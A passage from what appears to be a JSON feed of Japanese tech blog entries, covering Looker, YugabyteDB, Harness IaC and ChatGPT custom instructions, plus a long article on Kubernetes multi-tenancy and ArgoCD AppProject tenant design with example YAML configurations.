Pull Request をAIレビューしてみた。（日本語対応もしてみた）GitHub - Codium-ai/pr-agent: \uD83D\uDE80CodiumAI PR-Agent: An AI-Powered \uD83E\uDD16 Tool for Automated Pull Request Analysis, Feedback, Suggestions and More! \uD83D\uDCBB\uD83D\uDD0D","link":"https://syu-m-5151.hatenablog.com/entry/2023/09/06/165227","isoDate":"2023-09-06T07:52:27.000Z","dateMiliSeconds":1693986747000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"LookMLとは","contentSnippet":"これは何？Looker内にある機能である「LookML」について調べたことをまとめた個人的備忘録。 LookMLとはLookMLの紹介 \xa0|\xa0 Looker \xa0|\xa0 Google CloudLookML は、Looker Modeling Language の略です。セマンティックデータモデルを作成するためにLookerで使用される言語です。LookMLを使用して、SQLデータベース内のディメンション、集計、計算、およびデータの関係を記述できます。LookMLは「Looker上で利用できる独自の言語」のことをさす　別にMLや機械学習は関係ないLookerは、Lo...","link":"https://zenn.dev/nedoko_dok0dko/articles/18a4a04b98dcb8","isoDate":"2023-09-05T10:46:35.000Z","dateMiliSeconds":1693910795000,"authorName":"seno","authorId":"seno"},{"title":"Nodejs(Nest.js)のアプリケーションのbuildを高速化、slim化してみようの会","contentSnippet":"前提DockerによるNode.jsのインストール(pull)はキャッシュされているものとする.dockerignoreは以下の通りnode_modules.git.gitignore*.mddisttest 最初にまとめ軽く、そんなに依存関係が多くないアプリケーションであればnpmでstaging buildでキャッシュ効かせるぐらいでよいかもRUN --mount=type=cache,target= は効果がありそうである (https://zenn.dev/kou64yama/articles/powerful-docker-build-cache...","link":"https://zenn.dev/satohjohn/articles/c05d29f5d68e0c","isoDate":"2023-09-02T10:02:16.000Z","dateMiliSeconds":1693648936000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Lookerのユーザー権限について","contentSnippet":"これは何Lookerのユーザー権限一覧を個人的にまとめたものhttps://cloud.google.com/looker/docs/admin-panel-users-roles?hl=ja#default_permission_sets ユーザー権限一覧Admin:Developer、Viewer、Standard権限に加え、データソースへの接続やユーザー管理の権限を持つ現時点で確認できる、Adminでしかできない機能については以下データソース(BigQuery等)への接続設定ユーザーの追加・削除・権限の変更ユーザー・グループ単位のフォルダの公開・非公...","link":"https://zenn.dev/nedoko_dok0dko/articles/160cb146e72740","isoDate":"2023-08-31T17:22:40.000Z","dateMiliSeconds":1693502560000,"authorName":"seno","authorId":"seno"},{"title":"YugabyteDBのドキュメントを全部読む Day7","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Table Creationを読みました。今回はArchitecture > Core functions > Write I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Write I/O pathWrite I/O pathはYQLレイヤーで処理され、タブレットリーダーによってレプリケーションの準備が行なわれるシングルキーでの書き込みとして例示することが出来る。アトミックなアップデートを共なう複数キーでの分散トランザクションなど複雑なケースについては分散トランザクションに記載する。Write operation processing by YQL layerユーザーが発行したYQLクエリレイヤに作用するライトリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザーリクエストはYQLレイヤで内部キーに変換される。シャーディングで説明するように、それぞれのキーは一つのタブレットが所有する。どのタブレットがキーを所有するか特定するために、YQLレイヤはYB-MasterにRPC1呼び出しを実行する。そのレスポンスは将来の利用のためにキャッシュされる。YugabyteDBはタブレットの場所をキャッシュし直接参照することでネットワークホップを減らすことで、YQLレイヤが直接適切なYB-TServerにホストされるタブレットリーダーにリクエストを送信することが出来るスマートクライアントを持つ。YQLレイヤがローカルノードにタブレットリーダーを見つけた場合、RPCはローカルファンクションコールになりリクエストをシリアライズとデシリアライズしてネットワーク越しに送信する時間を節約することが出来る。その後YQLレイヤはタブレットリーダーをホストするYB-TServerへの書き込みを発行する。この書き込みはキーを所有するRaftグループのタブレットリーダーによって処理される。Preparation of the operation for replication by tablet leader下記の図はタブレットリーダーがレプリケーションを実行する処理を説明している。タブレットのRaft Groupリーダーは以下の処理を実行する。現在実行されている処理が現在のスキーマに対応しているかを判別するキーに対してローカルin-memoryロックマネージャーを利用してロックを取得する。このロック機構はフォロワーには存在しない必要であればデータを読み込む(read-modify-writeや条件付きアップデート命令など)DocDBに書き込まれる変更のバッチを準備する。この書き込みバッチは殆ど最終的にRocksDBに書き込まれるKey-Valueペアに近く、それぞれのキーの末尾に最終的なhybrid timestampが添えられていないだけであるRaft replication of the write operation書き込みのRaftレプリケーション処理の流れは以下のように説明することが出来る。リーダーがバッチをRaft logにアペンドし、書き込みのためのhybrid timestampを選択するRaftを利用しデータをピアーに複製する成功したRaft replicationのデータをローカルのDocDBに反映するユーザーに成功を返すフォロワータブレットはRaftを利用したデータの複製を受けつけ、コミットされた事が分ったタイミングでその複製をローカルのDocDBに反映する。リーダーは以下のようにコミットポイントに於ける後続のRPCリクエストの進行を進める。書き込みバッチを含むRaftエントリーは過半数以上のタブレットRaft Groupピアーに複製されるRaftのサブシステムから\\"Replication Successful\\"のコールバックを取得したあと、リーダーはローカルのDocDBにバッチの書き込みを適用するリーダーからの次の更新でエントリーがコミットされたことがフォロワーに通知され、フォロワーはそれぞれのRocksDBインスタンスにバッチの書き込みを適用する。Response to the clientInformation Pending2Exampleskとvという値をKという行とVという行をもつテーブルT1に挿入する例について考える3。この例ではユーザーアプリケーションがランダムなYugabyteDBサーバにWriteクエリを送信し、そのサーバがリクエストを適切にルーティングすると仮定して簡略化している。特にYCQLではYugabyteDB Smart Clientを使うことで、余分なネットワークホップを避けることが出来る。↩原文ママ。過去のバージョンでも記載無し↩INSERT INTO T1 (K,V) VALUES(\'k\',\'v\')ということ↩","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/7_core_functions_write_io_path","isoDate":"2023-08-30T16:03:36.000Z","dateMiliSeconds":1693411416000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Harness✖️TerraformでHarness IaC実現","contentSnippet":"はじめにHarnessのIaCを調査する（Harness Git Experience）上記ドキュメントでHarnessのIaCについて調査を行ったその結果、Pipelineレベルより抽象度の高いIaCにはTerraformを使用する必要があることがわかったそこで、Harness Terraform Providerを使用して、IaCを実現する githubリポジトリhttps://github.com/parupappa/harness-gitops-yokoo/tree/main/terraform 方針詳しい記述はREADME.mdに記載したので、そちらを...","link":"https://zenn.dev/yokoo_an209/articles/d599fb9896d2eb","isoDate":"2023-08-25T07:55:09.000Z","dateMiliSeconds":1692950109000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"ChatGPT \xd7 Slack = ChatOpsを実現する「h1-slack-bot」の紹介","contentSnippet":"1. はじめに はじめまして、Sreake事業部インターン生の井上です。私はSreake事業部にてSRE技術の調査と研究を行う目的で2023年3月6日から長期インターン生として参加しています。 本記事では、ChatOps […]The post ChatGPT \xd7 Slack = ChatOpsを実現する「h1-slack-bot」の紹介 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/chatgpt-slack-integration/","isoDate":"2023-08-24T07:04:08.000Z","dateMiliSeconds":1692860648000,"authorName":"Sreake","authorId":"Sreake"},{"title":"YugabyteDBのドキュメントを全部読む Day6","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Universe creationを読みました。今回はArchitecture > Core functions > Table Creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Table CrationYugabyteDBではユーザーにより実行されるテーブルの作成はYB-Masterのリーダーが実行する非同期APIによって管理される。YB-MasterはそのAPIでテーブルのスキーマと障害耐性を高めるために形成するRaftグループに所属するYB-Masterでのテーブル作成に必要な他の情報のレプリケーションが完了した段階でAPIの成功を返す。YB-Masterのリーダーがテーブル作成を実行するときは複数のステップが存在する。ValidationYB-Masterリーダーはテーブルスキーマの検証を行ない、指定された数のタブレットを作成する。これらのタブレットはこの段階ではYB-TServerには割り振られていない。ReplicationYB-MasterリーダーはYB-MasterのRaftグループにテーブルスキーマと新しく作成されたタブレット(この時点ではYB-TServerへの割り当て行なわれていない)の複製を行なう。この処理はYB-Masterリーダに障害が発生してもテーブル作成が成功することを保証する。Acknowledgementテーブル作成処理はYB-Masterリーダーに障害が発生しても処理を継続することが出来るため、この段階で非同期テーブル作成APIは成功を返す。ExecutionYB-Masterリーダーはそれぞれのタブレットをレプリケーションファクターとして指定された数だけYB-TServerに割り当てを行なう。このタブレットピアーの配置は指定された障害耐性を実現でき、またタブレットの割り当てがYB-TServerに均等に行なわれるように実行される。タブレットのYB-TServerへの割り当てはタブレットのレプリカが複数クラウド、リージョン、アヴェイラビリティゾーンをまたいで分散するといった追加の制約を満す必要がある。Continuous monitoringYB-Masterリーダーは全てのタブレットの割り当て処理を監視し、その実行状態と完了をユーザーが実行したAPIコールに対して応答する必要がある。Examplesテーブルが4ノードからなるYugabyteDBUniverseに作成される処理について考える。このときテーブルは16のタブレットと3つのレプリケーションファクターを持つとする。YB-Masterリーダーはスキーマを検証する。また16タブレット(合計48のタブレットピアー)を作成し、Raftを利用して過半数のYB-TServerにテーブルの作成に必要なデータを複製する。作成したタブレットをRaftグループを成すYB-TServerの中の指定された数のYB-TServer割り当て、リーダーの選出を行なう。このタブレットに属するキーに対する全てのリードとライトは、タブレットピアーのリーダーとRaftグループが責任を持つ。タブレットが割り当てられると長期に渡る障害か将来のロードバランシングが発生しYB-Masterにオーナーシップを変更されるまで、割り当て先のYB-TServerが所有する。タブレットリーダーをホストするYB-TServerの内の1台に障害が発生した場合、タブレットのRaftグループはI/Oを処理するために即座にリーダーエレクションを実行する。そのためYB-MasterはI/Oにおけるクリティカルパスになることはない。レプリケーション先となる候補を探す。この複製処理は段階的かつGracefulに実行される。","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/6_core_functions_table_creation","isoDate":"2023-08-23T14:26:45.000Z","dateMiliSeconds":1692800805000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ChatGPT: SREがCustom instructions機能を利用する","contentSnippet":"はじめに最近、ChatGPTからCustom instructions機能がリリースされました。Custom instructionsとは、ChatGPTの応答方法をより詳細に制御するカスタム命令を設定することができる機能です。ChatGPTの利用者にとって非常に便利な機能です。この機能により、ユーザーは特定の応答スタイルやフォーマットを要求することができるようになりました。これは、特定の業界や専門分野での使用など多岐にわたる用途に適応できるため、非常に有用です。めちゃくちゃ端的にかつ語弊を恐れずにいうと毎回、prompt を入力しなくてよくなるやつです。以前、公開したプロンプトに関するブログsyu-m-5151.hatenablog.comOpenAI CEOのSam Altman氏も、Custom instructionsのポストをしていましたので参考にしてみても良いかもしれません。damn i love custom instructions pic.twitter.com/su0BlttJF7— Sam Altman (@sama) 2023年7月22日  その上で私が利用してるものを公開します。What would you like ChatGPT to know about you to provide better responses?I\'m a software developer and primarily use Golang. Depending on the application, I also utilize Shell Script, Terraform, and Ansible.I am a software developer and I like Cloud Native technologies such as Docker and Kubernetes.I like to develop, operate, and optimize systems.Technical advisor for several other companies.Please use Japanese.How would you like ChatGPT to respond?You are an AI programming assistant.Your response should be informative and logical.First, think STEP-BY-STEP, then describe your plan for what to build.Then output the code in a single code block.Keep your answers objective and concise, and use Markdown formatting.Be sure to include the name of the programming language at the start of the Markdown code block.Avoid enclosing your entire response in a triple backtick.また、 respondに信頼性に関する言及を求めていたのですが有益な情報が得られないので削除しておきました。まとめCustom instructions機能は、ChatGPTの応答をより細かく制御する強力なツールです。これにより、ユーザーは特定のニーズに合わせてモデルを調整することができ、より多様で効果的な結果を得ることが可能になります。この機能の導入により、ChatGPTはさらに多岐にわたる分野での応用が期待されます。この書籍はChatGPTによって達成された科学的な貢献や重要性を理解することができるのでオススメです。ChatGPTの頭の中 (ハヤカワ新書)作者:スティーヴン ウルフラム早川書房Amazonおすすめ記事honeshabri.hatenablog.com","link":"https://syu-m-5151.hatenablog.com/entry/2023/08/22/204327","isoDate":"2023-08-22T11:43:27.000Z","dateMiliSeconds":1692704607000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"HarnessのIaCを調査する（Harness Git Experience）","contentSnippet":"はじめにHarnessで複数のパイプライン構築しようとするときに、いちいちGUIでパイプラインを１から構築していくのはSRE的な観点からみるとトイルと言わざるを得ないHarnessのネイティブ機能でパイプラインのclone（複製）はできるが、パラメータやクラスタの設定変更など全てプロビジョニングはできないそこで、Harnessで構築するパイプライン自体をIaCで管理すべく、Harness Git Experienceを中心に技術検証を行うHarness Git Experienceの概要はこちらを参照 調査公式quickstartを元にHarness Git Exper...","link":"https://zenn.dev/yokoo_an209/articles/8fd200bc6239ae","isoDate":"2023-08-21T08:15:15.000Z","dateMiliSeconds":1692605715000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"【ArgoCD\uD83D\uDC19️】KubernetesのマルチテナントパターンとArgoCDの実践テナント設計","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Kubernetesのマルチテナントパターンの種類マルチテナントパターンをArgoCDで実践する場合にオススメのパターン (★)ArgoCDのNamespacedスコープモードとClusterスコープモードArgoCDのテナントが防いでくれる誤った操作の具体例記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. なぜマルチテナントが必要なのかシングルテナントの場合マルチテナントの場合03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧Clusters as-a-ServiceControl Planes as-a-ServiceNamespaces as-a-Serviceカスタムリソーステナント04. ArgoCDでのテナントパターン実践一覧04-02. Clusters as-a-Service 実践実Clusterテナントオススメしない理由04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★オススメした理由04-04. Namespaces as-a-Service 実践04-05. カスタムリソーステナントの実践AppProjectテナントCLモード vs. NSモード05. CLモードなArgoCDCLモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)オススメしない理由05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)特にオススメした理由AppProjectテナント例の一覧テナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)オススメしなかった理由テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)オススメした理由テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)特にオススメした理由06. どのような誤った操作を防いでくれるのかマニフェストのデプロイ制限マニフェストをデプロイできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合カスタムリソースのReconciliation制限ArgoCD系カスタムリソースをReconciliationできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、熟成アルトバイエルンです。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19のマルチテナント化を担当しました。プロダクトが稼働するKubernetes Clusterが数十個あり、Clusterによっては複数のチームが合計100個以上のマイクロサービスを動かしています。このような大規模なマイクロサービスシステムがいくつもある状況下で、ArgoCDのマルチテナント設計の知見を深められたため、記事で解説しました。書きたいことを全部書いたところ、情報量がエグいことになってしまったため、気になる章だけでも拾って帰っていただけるとハッピーです\uD83D\uDE4FKubernetesのマルチテナントパターン (3章)ArgoCDでのテナントパターン実践一覧 (4章)ArgoCDのClusterスコープモードとNamespacedスコープモード (5章)どのような誤った操作を防いでくれるのか (6章)それでは、もりもり布教していきます\uD83D\uDE1702. なぜマルチテナントが必要なのかシングルテナントの場合そもそも、なぜArgoCDにマルチテナントが必要なのでしょうか。例えば、マニフェストのデプロイ先となるプロダクト用Cluster (例：foo、bar、baz) があると仮定します。ArgoCDをシングルテナントにする場合、各プロダクトチームの操作するApplicationを同じテナントに共存させることになります。この場合、単一のargocd-server (ダッシュボード) から全てのApplicationを操作できて便利です。しかし、プロダクト用Cluster数が増えていくにつれて、問題が起こり始めます。例えば、いずれかのプロダクトチームが誤ったApplicationを操作し、結果的に誤ったプロダクト用Clusterにマニフェストをデプロイしてしまう可能性があります。もちろん、システムでインシデントを起こしてやろうという悪意を持った人が、誤ったプロダクト用Clusterを意図的に選ぶ可能性もあります\uD83D\uDE08マルチテナントの場合その一方で、いい感じのマルチテナントにしたとします。プロダクトチームは、認可されたテナントに所属するApplicationにのみを操作でき、反対に無認可のテナントのApplicationは操作できません。これにより、誤ったプロダクト用Clusterにマニフェストをデプロイすることを防げます。03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧ArgoCDのテナント設計を実践する前に、Kubernetesにはどんなマルチテナントパターンがあるのでしょうか。Kubernetesのマルチテナントパターンは、以下に大別できます。         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      テナント単位         実Cluster         仮想Cluster         Namespace         ツール固有の論理空間      テナント間でKubernetesリソースを分離できるか         Clusterスコープリソース         ✅         ✅         ✅         ツールによる      Namespacedスコープリソース         ✅         ✅                  ツールによる      ツール         AWS EKSGCP GKEAzure AKEKubeadmなど         Kcptensile-kubevclusterVirtualClusterなど         Namespaceを増やすだけなので特別なツール不要         ArgoCDのAppProjectCapsuleのTenantkioskのAccountKubeZooのTenantなど      ▶ 他のマルチテナントの分類方法について\\"ソフトマルチテナンシー\\" と \\"ハードマルチテナンシー\\" といった分類方法もあります。この分類方法では、テナント間の分離度の観点で各マルチテナントを種別します。ソフトマルチテナンシーは、互いに信頼できる前提の上で、テナント間を弱く分離します。その一方で、ハードマルチテナンシーは、互いに信頼できない前提の上でテナント間を強く分離します。分離度がソフトとハードのいずれであるかに客観的な指標がなく、やや曖昧な種別になってしまうため、本記事の X as-a-Service の方が個人的には好みです♡♡♡The Kubernetes Book: 2024 Edition (English Edition)Multi-tenancy | KubernetesMulti-tenancy - EKS Best Practices GuidesClusters as-a-ServiceClusters as-a-Serviceは、テナントごとに独立したClusterを提供します。ツールとして、AWS EKS、GCP GKE、Azure AKE、Kubeadm、などがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Control Planes as-a-ServiceControl Planes as-a-Serviceは、テナントごとに独立したコントロールプレーン (言い換えば仮想Cluster) を提供します。ツールとして、Kcp、tensile-kube、vcluster、VirtualCluster、などがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Namespaces as-a-ServiceNamespaces as-a-Serviceは、テナントごとに独立したNamespaceを提供します。Namespaceを増やすだけなため、ツールは不要です。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?カスタムリソーステナントカスタムリソーステナントは、テナントごとにツール固有の論理空間 (例：ArgoCDのAppProject、CapsuleのTenant、kioskのAccount、KubeZooのTenant、など) を提供します。ツールによっては、X as-a-Service も兼ねている場合があります。今回紹介するAppProjectはNamespaceテナントを兼ねており、カスタムリソーステナント で解説しています。04. ArgoCDでのテナントパターン実践一覧お待たせしました。ここからは、KubernetesのマルチテナントパターンをArgoCDで具体的に実践し、おすすめのパターン実践を解説していきます。なお、オススメするものを ★ としています。         実Clusterテナント         仮想Clusterテナント         Namespaceテナント         AppProjectテナントCLモード         AppProjectテナントNSモード      対応するテナントパターン         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      ArgoCDがテナント間で占有 / 共有         占有         占有         占有         共有         占有      テナント間でKubernetesリソースを分離できるか         Namespacedスコープリソース         ✅         ✅         ✅         ✅         ✅      Clusterスコープリソース         ✅         ✅                                 オススメ                  ★                           ★★      How many do you need? Argo CD Architectures Explained - 2024 Update | Akuity以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。04-02. Clusters as-a-Service 実践実Clusterテナント実Clusterテナントは、Clusters as-a-Serviceなテナントの実践であり、実際のClusterをテナントの単位とします。後述の仮想Clusterと対比させるために、\\"実Cluster\\" と呼ぶことにします。各プロダクトチームは、実Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。オススメしない理由実Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。半年以内にアップグレードしないとサポートが切れるKubernetesクラスターが33個もあって、泣いちゃった— 長谷川 広樹 (俺です) (@Hiroki__IT) January 18, 2023  アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                      デメリットの回避策                                                                                  拡張性                 -                                                                                                                                                                     テナントを増やすために実Clusterを用意する必要があり、作業量が多い。                              ➡︎  IaCツールで実Clusterを用意するようにすれば作業量を減らせるが、やっぱりとてもつらい\uD83D\uDE2D       安全性(セキュリティ)        ClusterからClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                                  -                                                                                                ➡︎  -                                                                                                   保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に実Clusterを保守しないといけない。(例：アップグレード、機能修正、など)  ➡︎  回避できず、とてもつらい\uD83D\uDE2D                                                                           性能                  Clusterのハードウェアリソースを他のテナントと奪い合うことなく、これを独占できる。                                                                                     -                                                                                                ➡︎  -                                                                                                   信頼性                 テナントごとに実Clusterが独立しており、他の実Clusterから障害の影響を受けない。                                                                                        -                                                                                                ➡︎  -                                                                                    04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★仮想Clusterテナントは、Control Planes as-a-Serviceなテナントの実践であり、仮想Clusterをテナントの単位とします。各プロダクトチームは、仮想Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Using Argo CD with vclusters. Managing deployment to multiple… | by Daniel Helfand | Argo Projectオススメした理由仮想Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                               デメリットの回避策                                                                                    拡張性                 テナントを増やすためにマニフェストで定義した仮想Clusterを用意するだけでよく、実Clusterを用意することと比べて作業量が少ない。                                          -                                                                                                         ➡︎  -                                                                                            安全性(セキュリティ)        仮想ClusterからホストClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                        -                                                                                                         ➡︎  -                                                                                                     保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に仮想Clusterを保守しないといけない。(例：アップグレード、機能修正、など)  ➡︎  仮想Clusterに関する知見を持つ組織であれば、各テナントで保守できる。                                    性能                  -                                                                                                                                                                     Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                         ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                信頼性                 テナントごとに仮想Clusterが独立しており、他の仮想Clusterから障害の影響を受けない。                                                                                    -                                                                                                         ➡︎  -                                                                                      04-04. Namespaces as-a-Service 実践Namespaceテナントは、Namespaces as-a-Serviceなテナントの実践であり、Namespaceをテナントの単位とします。後述の AppProjectテナント は二重のテナントを持ち、Namespaceテナントも兼ねています。そのため、ここではNamespaceテナントの解説は省略します。04-05. カスタムリソーステナントの実践AppProjectテナントAppProjectテナントは、カスタムリソーステナントの実践であり、NamespaceとAppProjectをテナントの単位とします。AppProjectテナントは、二重のテナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持ち、\\"あらゆる面から\\" マニフェストのデプロイを制限します。特に、AppProjectはNamespaceスコープなカスタムリソースであり、自身に所属するApplicationを一括して制限します。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foo  # 自身に所属するApplicationを制限するspec: ...apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: infra-application  namespace: foospec:  # foo-tenantに所属する  project: foo-tenant  ...Argo CD in Practice: The GitOps way of managing cloud-native applications (English Edition)Projects - Argo CD - Declarative GitOps CD for Kubernetes▶ カスタムリソースの仕様について.spec.scopeキーからも分かる通り、AppProjectはNamespacedスコープなカスタムリソースであり、任意のNamespaceを設定できます\uD83D\uDC4DapiVersion: apiextensions.k8s.io/v1kind: CustomResourceDefinitionmetadata:  labels:    app.kubernetes.io/name: appprojects.argoproj.io    app.kubernetes.io/part-of: argocd  name: appprojects.argoproj.iospec:  group: argoproj.io  names:    kind: AppProject    ...  # Namespacedスコープなカスタムリソースであるとわかる  scope: Namespaced...  argo-cd/manifests/crds/appproject-crd.yaml at master \xb7 argoproj/argo-cd \xb7 GitHubExtend the Kubernetes API with CustomResourceDefinitions | KubernetesCLモード vs. NSモードArgoCDには、Clusterスコープモード と Namespacedスコープモード (以降、\\"CLモード\\" と \\"NSモード\\") があります。スコープモードに応じて、AppProjectテナントの設計方法が異なります。本章では、CLモードとNSモードの両方でAppProjectテナントを解説していきます。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetes05. CLモードなArgoCDCLモードなArgoCDとはCLモードなArgoCDの場合、各テナント間で共有のArgoCDを管理します例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。別途、ArgoCD専用のNamespace (argocd) を用意し、ここに関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesArgoCD: Multi-tenancy strategy. Introduction | by Geoffrey | MediumAppProjectNSモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App-Of-Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com  # CLモードでは設定が必要である  sourceNamespaces:    - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。一方で後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。そのため、.spec.sourceNamespacesキーで、特定のNamespaceのApplicationがこのAppProjectに所属できないように、ApplicationのNamespaceを制限しています。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)NSモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # CLモードでは設定が必要である  # 全てのNamespaceを指定したい場合は、ワイルドカードを設定する  application.namespaces: \\"*\\".application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。一方での後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。--application-namespacesオプションで、任意のNamespaceにアクセスするための認可を設定できます。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetes▶ --application-namespacesオプションの設定方法についてargocd-cmd-params-cmの代わりに、例えば以下のようにPodに引数を直接渡しても良いです\uD83D\uDE46\uD83C\uDFFB‍例えば、以下のような実装になります。apiVersion: v1kind: Podmetadata:  name: argocd-server  namespace: argocdspec:  containers:    - name: argocd-server      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-server        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...apiVersion: v1kind: Podmetadata:  name: argocd-application-controller  namespace: argocdspec:  containers:    - name: argocd-application-controller      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-application-controller        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...  `argocd-application-controller` Command Reference - Argo CD - Declarative GitOps CD for Kubernetes`argocd-server` Command Reference - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)NSモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:foo, *, *, foo/*/*, allow    p, role:bar, *, *, bar/*/*, allow    p, role:baz, *, *, baz/*/*, allow    g, foo-team, role:foo    g, bar-team, role:bar    g, baz-team, role:baz  scopes: \\"[groups]\\"認証済みグループ (foo-team、bar-team、baz-team) に対して、無認可のAppProject (foo、bar、baz) に所属するApplicationを操作できないように、認可スコープを制限しています。▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, 